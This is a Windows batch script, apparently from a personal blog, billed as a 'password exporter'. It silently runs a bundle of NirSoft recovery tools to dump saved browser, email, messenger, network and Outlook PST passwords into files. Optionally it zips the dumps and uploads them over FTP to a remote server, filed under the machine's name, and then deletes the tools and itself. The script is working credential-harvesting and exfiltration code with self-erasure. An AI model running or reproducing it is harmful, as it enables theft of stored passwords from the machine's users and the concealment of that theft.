@ ECHO OFF
TITLE PASSWORD EXPORTER
COLOR 0A
CLS
CD /D %~dp0



REM --------------------
REM CODE
REM --------------------

SET DAY=%DATE:~0,2%
SET MONTH=%DATE:~3,2%
SET YEAR=%DATE:~6,4%
SET HOURS=%TIME:~0,2%
SET MINUTES=%TIME:~3,2%
SET SECONDS=%TIME:~6,2%

IF "%HOURS:~0,1%"==" " SET HOURS=0%HOURS:~1,1%

SET NUMBER=%RANDOM%
SET NUMBER=0000%NUMBER%
SET NUMBER=%NUMBER:~-5%

SET CODE=%YEAR%%MONTH%%DAY%%HOURS%%MINUTES%%SECONDS%%NUMBER%

REM --------------------
REM CHARACTERS
REM --------------------

SET TABULATION=	



IF NOT EXIST CONFIGURATION.CMD GOTO REBUILD

CALL CONFIGURATION.CMD



IF NOT EXIST %LOG_DIR% MKDIR %LOG_DIR%
IF NOT EXIST %BACKUP_DIR% MKDIR %BACKUP_DIR%

SET BACKUP=%BACKUP_DIR%\%COMPUTERNAME%\%CODE%

>> %LOG% ECHO --------------------------------------------------
>> %LOG% ECHO PASSWORD EXPORTER 1.0
>> %LOG% ECHO Il Favoloso Mondo di Leo
>> %LOG% ECHO https://ilfavolosomondodileo.wordpress.com/
>> %LOG% ECHO --------------------------------------------------
>> %LOG% ECHO %DAY%/%MONTH%/%YEAR% %HOURS%:%MINUTES%:%SECONDS%
>> %LOG% ECHO --------------------------------------------------
>> %LOG% ECHO.

IF NOT EXIST %SOFTWARE_DIR% (

IF EXIST NirSoft.zip 7za.exe x "NirSoft.zip" -o"%SOFTWARE_DIR%" -p"cTo*:e],B?UbFcq6" -y >> %LOG% && ECHO. >> %LOG%
IF NOT EXIST NirSoft.zip GOTO ERROR

)

IF NOT EXIST %SOFTWARE_DIR%\ChromePass.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\Dialupass.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\iepv.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\mailpv.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\mspass.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\netpass.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\PasswordFox.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\PstPassword.exe GOTO ERROR
IF NOT EXIST %SOFTWARE_DIR%\WebBrowserPassView.exe GOTO ERROR



REM comma

IF "%comma%"=="YES" (

IF NOT EXIST %BACKUP%\comma MKDIR %BACKUP%\comma

ECHO comma && >> %LOG% ECHO comma

%SOFTWARE_DIR%\ChromePass.exe /scomma "%BACKUP%\comma\ChromePass.%comma_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /scomma "%BACKUP%\comma\Dialupass.%comma_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /scomma "%BACKUP%\comma\IE PassView.%comma_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /scomma "%BACKUP%\comma\Mail PassView.%comma_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /scomma "%BACKUP%\comma\MessenPass.%comma_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /scomma "%BACKUP%\comma\Network Password Recovery.%comma_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /scomma "%BACKUP%\comma\PasswordFox.%comma_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /scomma "%BACKUP%\comma\PstPassword.%comma_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /scomma "%BACKUP%\comma\WebBrowserPassView.%comma_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM html

IF "%html%"=="YES" (

IF NOT EXIST %BACKUP%\html MKDIR %BACKUP%\html

ECHO html && >> %LOG% ECHO html

%SOFTWARE_DIR%\ChromePass.exe /shtml "%BACKUP%\html\ChromePass.%html_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /shtml "%BACKUP%\html\Dialupass.%html_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /shtml "%BACKUP%\html\IE PassView.%html_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /shtml "%BACKUP%\html\Mail PassView.%html_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /shtml "%BACKUP%\html\MessenPass.%html_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /shtml "%BACKUP%\html\Network Password Recovery.%html_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /shtml "%BACKUP%\html\PasswordFox.%html_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /shtml "%BACKUP%\html\PstPassword.%html_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /shtml "%BACKUP%\html\WebBrowserPassView.%html_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM tab

IF "%tab%"=="YES" (

IF NOT EXIST %BACKUP%\tab MKDIR %BACKUP%\tab

ECHO tab && >> %LOG% ECHO tab

%SOFTWARE_DIR%\ChromePass.exe /stab "%BACKUP%\tab\ChromePass.%tab_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /stab "%BACKUP%\tab\Dialupass.%tab_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /stab "%BACKUP%\tab\IE PassView.%tab_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /stab "%BACKUP%\tab\Mail PassView.%tab_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /stab "%BACKUP%\tab\MessenPass.%tab_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /stab "%BACKUP%\tab\Network Password Recovery.%tab_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /stab "%BACKUP%\tab\PasswordFox.%tab_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /stab "%BACKUP%\tab\PstPassword.%tab_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /stab "%BACKUP%\tab\WebBrowserPassView.%tab_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM tabular

IF "%tabular%"=="YES" (

IF NOT EXIST %BACKUP%\tabular MKDIR %BACKUP%\tabular

ECHO tabular && >> %LOG% ECHO tabular

%SOFTWARE_DIR%\ChromePass.exe /stabular "%BACKUP%\tabular\ChromePass.%tabular_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /stabular "%BACKUP%\tabular\Dialupass.%tabular_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /stabular "%BACKUP%\tabular\IE PassView.%tabular_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /stabular "%BACKUP%\tabular\Mail PassView.%tabular_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /stabular "%BACKUP%\tabular\MessenPass.%tabular_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /stabular "%BACKUP%\tabular\Network Password Recovery.%tabular_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /stabular "%BACKUP%\tabular\PasswordFox.%tabular_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /stabular "%BACKUP%\tabular\PstPassword.%tabular_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /stabular "%BACKUP%\tabular\WebBrowserPassView.%tabular_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM text

IF "%text%"=="YES" (

IF NOT EXIST %BACKUP%\text MKDIR %BACKUP%\text

ECHO text && >> %LOG% ECHO text

%SOFTWARE_DIR%\ChromePass.exe /stext "%BACKUP%\text\ChromePass.%text_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /stext "%BACKUP%\text\Dialupass.%text_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /stext "%BACKUP%\text\IE PassView.%text_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /stext "%BACKUP%\text\Mail PassView.%text_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /stext "%BACKUP%\text\MessenPass.%text_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /stext "%BACKUP%\text\Network Password Recovery.%text_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /stext "%BACKUP%\text\PasswordFox.%text_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /stext "%BACKUP%\text\PstPassword.%text_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /stext "%BACKUP%\text\WebBrowserPassView.%text_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM verhtml

IF "%verhtml%"=="YES" (

IF NOT EXIST %BACKUP%\verhtml MKDIR %BACKUP%\verhtml

ECHO verhtml && >> %LOG% ECHO verhtml

%SOFTWARE_DIR%\ChromePass.exe /sverhtml "%BACKUP%\verhtml\ChromePass.%verhtml_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /sverhtml "%BACKUP%\verhtml\Dialupass.%verhtml_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /sverhtml "%BACKUP%\verhtml\IE PassView.%verhtml_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /sverhtml "%BACKUP%\verhtml\Mail PassView.%verhtml_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /sverhtml "%BACKUP%\verhtml\MessenPass.%verhtml_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /sverhtml "%BACKUP%\verhtml\Network Password Recovery.%verhtml_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /sverhtml "%BACKUP%\verhtml\PasswordFox.%verhtml_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /sverhtml "%BACKUP%\verhtml\PstPassword.%verhtml_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /sverhtml "%BACKUP%\verhtml\WebBrowserPassView.%verhtml_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)

REM xml

IF "%xml%"=="YES" (

IF NOT EXIST %BACKUP%\xml MKDIR %BACKUP%\xml

ECHO xml && >> %LOG% ECHO xml

%SOFTWARE_DIR%\ChromePass.exe /sxml "%BACKUP%\xml\ChromePass.%xml_EXTENSION%" && ECHO %TABULATION%ChromePass && >> %LOG% ECHO %TABULATION%ChromePass
%SOFTWARE_DIR%\Dialupass.exe /sxml "%BACKUP%\xml\Dialupass.%xml_EXTENSION%" && ECHO %TABULATION%Dialupass && >> %LOG% ECHO %TABULATION%Dialupass
%SOFTWARE_DIR%\iepv.exe /sxml "%BACKUP%\xml\IE PassView.%xml_EXTENSION%" && ECHO %TABULATION%IE PassView && >> %LOG% ECHO %TABULATION%IE PassView
%SOFTWARE_DIR%\mailpv.exe /sxml "%BACKUP%\xml\Mail PassView.%xml_EXTENSION%" && ECHO %TABULATION%Mail PassView && >> %LOG% ECHO %TABULATION%Mail PassView
%SOFTWARE_DIR%\mspass.exe /sxml "%BACKUP%\xml\MessenPass.%xml_EXTENSION%" && ECHO %TABULATION%MessenPass && >> %LOG% ECHO %TABULATION%MessenPass
%SOFTWARE_DIR%\netpass.exe /sxml "%BACKUP%\xml\Network Password Recovery.%xml_EXTENSION%" && ECHO %TABULATION%Network Password Recovery && >> %LOG% ECHO %TABULATION%Network Password Recovery
%SOFTWARE_DIR%\PasswordFox.exe /sxml "%BACKUP%\xml\PasswordFox.%xml_EXTENSION%" && ECHO %TABULATION%PasswordFox && >> %LOG% ECHO %TABULATION%PasswordFox
%SOFTWARE_DIR%\PstPassword.exe /sxml "%BACKUP%\xml\PstPassword.%xml_EXTENSION%" && ECHO %TABULATION%PstPassword && >> %LOG% ECHO %TABULATION%PstPassword
%SOFTWARE_DIR%\WebBrowserPassView.exe /sxml "%BACKUP%\xml\WebBrowserPassView.%xml_EXTENSION%" && ECHO %TABULATION%WebBrowserPassView && >> %LOG% ECHO %TABULATION%WebBrowserPassView

ECHO. && >> %LOG% ECHO.

)



IF "%SAVE%"=="FTP" (

7za.exe a "%CODE%.ZIP" "%BACKUP_DIR%\*" -p"%PASSWORD%" >> %LOG% && ECHO. >> %LOG%

IF EXIST %INPUT% DEL %INPUT%

IF NOT EXIST %INPUT% (

>> %INPUT% ECHO open %SERVER% %PORT%
>> %INPUT% ECHO %USER%
>> %INPUT% ECHO %PASSWORD%
>> %INPUT% ECHO binary
>> %INPUT% ECHO mkdir "/%DIRECTORY%"
>> %INPUT% ECHO mkdir "/%DIRECTORY%/%COMPUTERNAME%"
>> %INPUT% ECHO put %CODE%.ZIP "/%DIRECTORY%/%COMPUTERNAME%/%CODE%.ZIP"
>> %INPUT% ECHO disconnect
>> %INPUT% ECHO quit

)

C:\Windows\System32\ftp.exe -s:INPUT.FTP >> %LOG%

)

GOTO EXIT



: REBUILD

REM COMPLETE SOFTWARE RECONSTRUCTION

IF NOT EXIST CONFIGURATION.CMD ECHO FILE NOT FOUND CONFIGURATION.CMD

PAUSE > NUL

EXIT



: ERROR

ECHO ERROR && >> %LOG% ECHO ERROR
ECHO. && >> %LOG% ECHO.

IF NOT EXIST NirSoft.zip ECHO %TABULATION%FILE NOT FOUND NirSoft.zip && >> %LOG% ECHO %TABULATION%FILE NOT FOUND NirSoft.zip
IF NOT EXIST %SOFTWARE_DIR%\ChromePass.exe ECHO %TABULATION%FILE NOT FOUND ChromePass.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND ChromePass.exe
IF NOT EXIST %SOFTWARE_DIR%\Dialupass.exe ECHO %TABULATION%FILE NOT FOUND Dialupass.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND Dialupass.exe
IF NOT EXIST %SOFTWARE_DIR%\iepv.exe ECHO %TABULATION%FILE NOT FOUND iepv.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND iepv.exe
IF NOT EXIST %SOFTWARE_DIR%\mailpv.exe ECHO %TABULATION%FILE NOT FOUND mailpv.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND mailpv.exe
IF NOT EXIST %SOFTWARE_DIR%\mspass.exe ECHO %TABULATION%FILE NOT FOUND mspass.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND mspass.exe
IF NOT EXIST %SOFTWARE_DIR%\netpass.exe ECHO %TABULATION%FILE NOT FOUND netpass.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND netpass.exe
IF NOT EXIST %SOFTWARE_DIR%\PasswordFox.exe ECHO %TABULATION%FILE NOT FOUND PasswordFox.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND PasswordFox.exe
IF NOT EXIST %SOFTWARE_DIR%\PstPassword.exe ECHO %TABULATION%FILE NOT FOUND PstPassword.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND PstPassword.exe
IF NOT EXIST %SOFTWARE_DIR%\WebBrowserPassView.exe ECHO %TABULATION%FILE NOT FOUND WebBrowserPassView.exe && >> %LOG% ECHO %TABULATION%FILE NOT FOUND WebBrowserPassView.exe

: EXIT



IF "%DESTRUCTION%"=="NO" (

IF "%SAVE%"=="LOCAL" (

REM EXAMPLE

)

IF "%SAVE%"=="FTP" (

IF EXIST %CODE%.ZIP DEL %CODE%.ZIP
IF EXIST %INPUT% DEL %INPUT%

)

)



IF "%DESTRUCTION%"=="YES" (

IF "%SAVE%"=="LOCAL" (

IF EXIST %SOFTWARE_DIR% RMDIR /S /Q %SOFTWARE_DIR%
IF EXIST 7za.exe DEL 7za.exe
IF EXIST NirSoft.zip DEL NirSoft.zip
IF EXIST CONFIGURATION.CMD DEL CONFIGURATION.CMD
IF EXIST PASSWORD EXPORTER.CMD DEL PASSWORD EXPORTER.CMD

)

IF "%SAVE%"=="FTP" (

IF EXIST %SOFTWARE_DIR% RMDIR /S /Q %SOFTWARE_DIR%
IF EXIST 7za.exe DEL 7za.exe
IF EXIST %CODE%.ZIP DEL %CODE%.ZIP
IF EXIST NirSoft.zip DEL NirSoft.zip
IF EXIST %INPUT% DEL %INPUT%
IF EXIST CONFIGURATION.CMD DEL CONFIGURATION.CMD
IF EXIST PASSWORD EXPORTER.CMD DEL PASSWORD EXPORTER.CMD

)

)



START /WAIT C:\Windows\System32\notepad.exe %LOG%



EXIT